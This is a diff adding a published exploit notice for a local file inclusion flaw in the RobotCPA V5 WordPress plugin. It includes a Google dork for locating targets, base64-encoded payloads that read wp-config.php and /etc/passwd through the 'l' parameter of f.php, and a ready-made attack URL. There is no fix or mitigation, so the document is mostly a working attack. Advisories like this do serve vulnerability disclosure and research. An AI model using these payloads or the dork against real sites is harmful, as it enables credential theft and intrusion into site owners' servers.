@@ -1,0 +1,23 @@
+# Exploit Title: Wordpress Plugin RobotCPA V5 - Local File Include
+# Google Dork: inurl:"/wp-content/plugins/robotcpa/"
+# Date: 09.06.2015
+# Exploit Author: T3N38R15
+# Vendor Homepage: http://robot-cpa.good-info.co/
+# Version: 5V
+# Tested on: Windows (Firefox)
+                   Linux      (Firefox)
+The affected file is f.php and the get-parameter "l" is vulnerable to local file inclusion.
+We just need to base64 encode our injection.
+Like that : 
+php://filter/resource=./../../../wp-config.php
+cGhwOi8vZmlsdGVyL3Jlc291cmNlPS4vLi4vLi4vLi4vd3AtY29uZmlnLnBocA==
+or
+file:///etc/passwd
+ZmlsZTovLy9ldGMvcGFzc3dk
+
+our injection look then like that :
+http://domain.com/wp-content/plugins/robotcpa/f.php?l=ZmlsZTovLy9ldGMvcGFzc3dk
+and we can see the content of the passwd file.
+
+greets to Black Sniper
+Regards T3N38R15
